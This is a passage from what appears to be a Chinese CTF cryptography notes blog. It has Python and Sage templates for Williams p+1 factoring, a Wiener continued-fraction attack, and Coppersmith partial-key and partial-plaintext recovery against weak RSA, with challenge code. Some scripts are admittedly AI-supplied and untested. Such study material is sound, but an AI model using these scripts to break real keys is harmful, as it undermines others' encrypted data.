count</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primerange</span><br><span class="line">n = ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v, a, n</span>):</span><br><span class="line">    v1, v2 = v, (v ** <span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            v1, v2 = (v1 ** <span class="number">2</span> - <span class="number">2</span>) % n, (v1 * v2 - v) % n</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v1, v2 = (v1 * v2 - v) % n, (v2 ** <span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">return</span> v1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primegen</span>():</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> primerange(<span class="number">2</span>, <span class="number">10</span>**<span class="number">6</span>)  <span class="comment"># 生成到 10^6 的素数，够用了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ilog</span>(<span class="params">x, b</span>):</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt;= b:</span><br><span class="line">        x //= b</span><br><span class="line">        l += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> l</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):  <span class="comment"># 不断尝试新的 v</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> primegen():</span><br><span class="line">            e = ilog(isqrt(n), p)</span><br><span class="line">            <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">                v = mlucas(v, p, n)</span><br><span class="line">            g = gcd(v - <span class="number">2</span>, n)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">int</span>(g), <span class="built_in">int</span>(n // g)</span><br><span class="line">            <span class="keyword">if</span> g == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">p1, q1 = attack(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q1&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这个是魔改板子,条件是p+1还有一个很大的已知质数因子<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt,gcd</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> primerange</span><br><span class="line">n=...</span><br><span class="line">known_factor=<span class="number">0x1337133701</span>		<span class="comment"># p+1 的已知大素因子</span></span><br><span class="line">max_other_factor=<span class="number">50000</span>			<span class="comment"># 其他因子的最大值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v,a,n</span>):</span><br><span class="line">	v1,v2=v,(v**<span class="number">2</span>-<span class="number">2</span>)%n</span><br><span class="line">	<span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]:</span><br><span class="line">		<span class="keyword">if</span> bit==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">			v1,v2=(v1**<span class="number">2</span>-<span class="number">2</span>)%n,(v1*v2-v)%n</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			v1,v2=(v1*v2-v)%n,(v2**<span class="number">2</span>-<span class="number">2</span>)%n</span><br><span class="line">	<span class="keyword">return</span> v1</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primegen</span>(<span class="params">max_limit</span>):</span><br><span class="line">	<span class="keyword">yield</span> <span class="keyword">from</span> primerange(<span class="number">2</span>,max_limit+<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ilog</span>(<span class="params">x,b</span>):</span><br><span class="line">	l=<span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> x&gt;=b:</span><br><span class="line">		x//=b</span><br><span class="line">		l+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> l</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimized_attack</span>(<span class="params">n,known_factor,max_other_factor</span>):</span><br><span class="line">	<span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):</span><br><span class="line">		e=ilog(isqrt(n),known_factor)</span><br><span class="line">		<span class="keyword">if</span> e&gt;<span class="number">0</span>:</span><br><span class="line">			<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">				v=mlucas(v,known_factor,n)</span><br><span class="line">			g=gcd(v-<span class="number">2</span>,n)</span><br><span class="line">			<span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;n:</span><br><span class="line">				<span class="keyword">return</span> g,n//g</span><br><span class="line">			<span class="keyword">if</span> g==n:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">for</span> p <span class="keyword">in</span> primegen(max_other_factor):</span><br><span class="line">			e=ilog(isqrt(n),p)</span><br><span class="line">			<span class="keyword">if</span> e==<span class="number">0</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			combined_factor=known_factor*p</span><br><span class="line">			<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">				v=mlucas(v,combined_factor,n)</span><br><span class="line">			g=gcd(v-<span class="number">2</span>,n)</span><br><span class="line">			<span class="keyword">if</span> <span class="number">1</span>&lt;g&lt;n:</span><br><span class="line">				<span class="keyword">return</span> <span class="built_in">int</span>(g),<span class="built_in">int</span>(n//g)</span><br><span class="line">			<span class="keyword">if</span> g==n:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	p1,q1=optimized_attack(n,known_factor,max_other_factor)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q1&#125;</span>&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;验证: n = p * q = <span class="subst">&#123;p1*q1==n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;分解失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="Wiener-Attack-维纳攻击-连分数攻击"><a href="#Wiener-Attack-维纳攻击-连分数攻击" class="headerlink" title="Wiener Attack 维纳攻击 连分数攻击"></a>Wiener Attack 维纳攻击 连分数攻击</h2><p>本质是求满足下面条件的d:</p>
<script type="math/tex; mode=display">ed=1+kp</script><script type="math/tex; mode=display">d<p^{0.25}</script><p>只要存在这个d和k,不需要管p是什么数,连分数能求出来答案(e和p已知).</p>
<p>看看下面的例题:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">pad = <span class="keyword">lambda</span> m, l: m + <span class="built_in">bytes</span>(random.randrange(<span class="number">256</span>)*<span class="built_in">bool</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="built_in">len</span>(m)))</span><br><span class="line">unpad = <span class="keyword">lambda</span> m: m[:m.index(<span class="number">0</span>)] <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">in</span> m <span class="keyword">else</span> m</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="number">3</span>, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> q % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="built_in">pow</span>(<span class="number">3</span>, (q-<span class="number">1</span>)//<span class="number">2</span>, q) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = random.randrange(phi) | <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> GCD(d, (p**<span class="number">4</span>-<span class="number">1</span>)*(q**<span class="number">4</span>-<span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">        e = <span class="built_in">pow</span>(d, -<span class="number">1</span>, (p**<span class="number">4</span>-<span class="number">1</span>)*(q**<span class="number">4</span>-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m: <span class="built_in">list</span>[<span class="built_in">int</span>], e: <span class="built_in">int</span>, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> [(aa + bb) % n <span class="keyword">for</span> aa, bb <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            (a[<span class="number">0</span>]*b[<span class="number">0</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">1</span>] - <span class="number">3</span>*a[<span class="number">2</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">1</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">1</span>]*b[<span class="number">0</span>] + a[<span class="number">0</span>]*b[<span class="number">1</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">2</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">2</span>]*b[<span class="number">0</span>] + a[<span class="number">1</span>]*b[<span class="number">1</span>] + a[<span class="number">0</span>]*b[<span class="number">2</span>] - <span class="number">3</span>*a[<span class="number">3</span>]*b[<span class="number">3</span>]) % n,</span><br><span class="line">            (a[<span class="number">3</span>]*b[<span class="number">0</span>] + a[<span class="number">2</span>]*b[<span class="number">1</span>] + a[<span class="number">1</span>]*b[<span class="number">2</span>] + a[<span class="number">0</span>]*b[<span class="number">3</span>]) % n</span><br><span class="line">        ]</span><br><span class="line">    c = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    dbl = m[:]</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(e)[<span class="number">2</span>:])):</span><br><span class="line">        <span class="keyword">if</span> b:</span><br><span class="line">            c = _mul(c, dbl)</span><br><span class="line">        dbl = _mul(dbl, dbl)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">m = [</span><br><span class="line">    bytes_to_long(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">4</span>:<span class="number">2</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="number">2</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>:<span class="number">3</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>], <span class="number">255</span>)),</span><br><span class="line">    bytes_to_long(pad(flag[<span class="number">3</span>*<span class="built_in">len</span>(flag)//<span class="number">4</span>:], <span class="number">255</span>))</span><br><span class="line">]</span><br><span class="line">c = encrypt(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>hint:这是一个“四次扩环” $\mathbb{Z}_N(t)/(t^4+3) \cong \mathbb{F}_p(\sqrt[4]{-3}) \times \mathbb{F}_q(\sqrt[4]{-3})$ 上的RSA.  </p>
<p>不要被吓跑…<br>即使是放到了环上,由于欧拉定理,RSA依旧满足ed加解密的性质.p和q不是连分数且p和q没关系,所以不能直接分解n.<br>但是我们发现d在 $n^4$ 下似乎很小,所以对这个e和d和 $n^4$ 使用连分数攻击,就能求出d,进而恢复明文.</p>
<h3 id="CopperSmith"><a href="#CopperSmith" class="headerlink" title="CopperSmith"></a>CopperSmith</h3><p>只知道一个质数多少位,然后剩下的不知道,你要尝试分解n…  </p>
<p><strong>调参</strong> :beta是pq相对的大小关系,一般取 <code>0.3-0.5</code> .<br>epsilon是格的大小,越小越精确(算的时间越长),取 <code>0.01-0.5</code> .</p>
<h4 id="2048位知道前1108位不知道后940位"><a href="#2048位知道前1108位不知道后940位" class="headerlink" title="2048位知道前1108位不知道后940位:"></a>2048位知道前1108位不知道后940位:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n = ...</span><br><span class="line">p_high = ... <span class="comment"># 16进制形式的前1108位</span></span><br><span class="line">e = ...</span><br><span class="line">c = ...</span><br><span class="line"><span class="comment"># 缺失位数</span></span><br><span class="line">missing_bits = <span class="number">940</span></span><br><span class="line"><span class="comment"># 计算p_known = p_high &lt;&lt; missing_bits</span></span><br><span class="line">p_known = p_high * (<span class="number">2</span> ** missing_bits)</span><br><span class="line"><span class="comment"># 定义多项式</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p_known</span><br><span class="line"><span class="comment"># X是未知位的最大和值</span></span><br><span class="line">X = <span class="number">2</span> ** missing_bits  <span class="comment"># 因为x小于2^940</span></span><br><span class="line">roots = f.small_roots(X=X, beta=<span class="number">0.5</span>, epsilon=<span class="number">0.03</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">	x0 = roots[<span class="number">0</span>]</span><br><span class="line">	p = p_known + x0</span><br><span class="line">	<span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;p found:&quot;</span>, p)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Found candidate but not factor.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="知道低位400求高位112"><a href="#知道低位400求高位112" class="headerlink" title="知道低位400求高位112"></a>知道低位400求高位112</h3><p>这个码跑的比上面的快超级多,不知道为什么…<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=</span><br><span class="line">pl=</span><br><span class="line">x=Zmod(n)[<span class="string">&#x27;x&#x27;</span>].gen()</span><br><span class="line">f=x*<span class="number">2</span>**<span class="number">400</span>+pl</span><br><span class="line">f.monic().small_roots(X=<span class="number">2</span>**<span class="number">112</span>,beta=<span class="number">0.49</span>,epsilon=<span class="number">0.02</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="3q-给定n-p-q-3-以及q的高381位-尝试分解pq"><a href="#3q-给定n-p-q-3-以及q的高381位-尝试分解pq" class="headerlink" title="3q: 给定n=p*(q^3) 以及q的高381位,尝试分解pq:"></a>3q: 给定n=p*(q^3) 以及q的高381位,尝试分解pq:</h3><p>GPT告诉我说要构造一个模n等于0的多项式然后跑copper,然后管理员告诉我说这个题并不是二元copper.<br>得出结论:直接在原有的板子上修改即可.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">n = ...</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = ...</span><br><span class="line">hint = ...</span><br><span class="line"></span><br><span class="line">missing_bits = <span class="number">643</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算p_known = p_high &lt;&lt; missing_bits</span></span><br><span class="line">p_known = hint * (<span class="number">2</span> ** missing_bits)</span><br><span class="line"><span class="comment"># 定义多项式</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (x + p_known)**<span class="number">3</span></span><br><span class="line"><span class="comment"># X是未知位的最大和值</span></span><br><span class="line">X = <span class="number">2</span> ** missing_bits  <span class="comment"># 因为x小于2^940</span></span><br><span class="line">roots = f.small_roots(X=X, beta=<span class="number">0.5</span>, epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">	x0 = roots[<span class="number">0</span>]</span><br><span class="line">	p = p_known + x0</span><br><span class="line">	<span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;p found:&quot;</span>, p)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Found candidate but not factor.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<h3 id="已知明文低位求高位"><a href="#已知明文低位求高位" class="headerlink" title="已知明文低位求高位"></a>已知明文低位求高位</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">stutter</span>(<span class="params">text, cipher = <span class="literal">None</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(text):</span><br><span class="line">        t = random.randint(<span class="number">1</span>, <span class="number">6</span>)</span><br><span class="line">        subtext = text[i:i+t] + <span class="string">&#x27;...&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(subtext <span class="keyword">if</span> cipher <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> cipher(subtext))</span><br><span class="line">        i += t</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encipherer</span>(<span class="params">N, e = <span class="number">0x10001</span>, l = <span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encipher</span>(<span class="params">m</span>):</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(<span class="built_in">pow</span>(bytes_to_long(pad(m.encode(<span class="string">&#x27;utf-8&#x27;</span>), l)), e, N)).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> _encipher</span><br><span class="line">e = <span class="number">13</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    N = p * q</span><br><span class="line">    <span class="keyword">if</span> GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>), e) == <span class="number">1</span>: <span class="keyword">break</span></span><br><span class="line">stutter(flag, encipherer(N, e))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;N = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>首先,pad是长度一定答案一定的,其次,长度只有6种,所以我们近似得到了明文绝大多数低位.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">	tmp=tmp+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">	out=tmp+<span class="string">b&#x27;...&#x27;</span></span><br><span class="line">	<span class="built_in">print</span>(bytes_to_long(pad(out,<span class="number">256</span>)))</span><br></pre></td></tr></table></figure><br>首先得到没了flag的时候上面的低位(6种情况),然后构造coppersmith(deepseek给的板子,错了再说):<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">cc=[<span class="comment"># 给出的密文</span></span><br><span class="line">	,</span><br><span class="line">]</span><br><span class="line">clow=[<span class="comment"># 明文低位</span></span><br><span class="line">	,</span><br><span class="line">]</span><br><span class="line">N = ...</span><br><span class="line">e = <span class="number">13</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cc:</span><br><span class="line">	<span class="keyword">for</span> low_m <span class="keyword">in</span> clow:</span><br><span class="line">		unknown_bits = <span class="number">48</span> <span class="comment"># 未知的位数（6字节=48位）</span></span><br><span class="line">		<span class="comment"># 构造多项式：f(x) = (x * 2^known_bits + low_m)^e - c mod N</span></span><br><span class="line">		known_bits = <span class="number">250</span> * <span class="number">8</span>  <span class="comment"># 已知250字节，即2000位</span></span><br><span class="line">		P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">		<span class="comment"># 定义多项式：f(x) = (x * 2^known_bits + low_m)^e - c</span></span><br><span class="line">		f = ((x * <span class="number">2</span>^known_bits + low_m)^e - c).monic()</span><br><span class="line">		x0 = f.small_roots(X=<span class="number">2</span>^unknown_bits, beta=<span class="number">1.0</span>, epsilon=<span class="number">0.05</span>)</span><br><span class="line">		<span class="keyword">if</span> x0:</span><br><span class="line">			x0 = x0[<span class="number">0</span>]</span><br><span class="line">			high_m = x0</span><br><span class="line">			total_m = high_m * <span class="number">2</span>^known_bits + low_m</span><br><span class="line">			<span class="built_in">print</span>(total_m)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;No solutions found&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p><strong>后知后觉</strong> :之前看hint说,e很小的时候,Flu只觉得可能和什么爆破有关,查了一下发现也不是直接开根号的板子,因为明文和N差不多大.<br>直到ds给出脚本的时候才发现e和多项式阶数直接相关,没准e大点就解不出来了.</p>
<h2 id="大数处理"><a href="#大数处理" class="headerlink" title="大数处理"></a>大数处理</h2><p>就是,给定一个很大的数的函数,输出一个小数,一般在密码学都是什么神秘暴力展开,然后做了一些神秘的操作,由于展开太费时间,用二分的check都得算好几个小时…<br>于是这里记录sage怎么写.</p>
<h3 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MySeries</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num</span>):</span><br><span class="line">        self.num = num</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Coe</span>(<span class="params">self, n</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        c = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; n:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            c = (c * (<span 